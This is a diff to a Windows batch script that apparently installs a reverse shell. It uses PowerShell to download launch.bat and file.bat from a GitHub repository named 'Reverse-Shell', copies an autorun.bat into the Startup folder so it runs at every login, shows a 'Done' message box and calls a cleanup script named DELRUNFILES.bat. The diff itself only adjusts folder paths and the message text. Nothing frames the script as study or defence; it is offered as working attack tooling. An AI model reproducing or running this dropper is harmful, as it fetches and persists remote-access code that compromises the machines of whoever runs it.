@@ -1,6 +1,7 @@
 @echo off
 c:
 cd C:\
+cd Temp
 cd kaas
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
@@ -15,7 +16,8 @@ cd Programs
 cd Startup
 xcopy /s/y c:\kaas\autorun.bat
 cd C:\
+cd Temp
 cd kaas
-echo x=msgbox("Done" ,0, "run.exe") >> msgbox.vbs
+echo x=msgbox("Done" ,0, "Done") >> msgbox.vbs
 start msgbox.vbs
 DELRUNFILES.bat
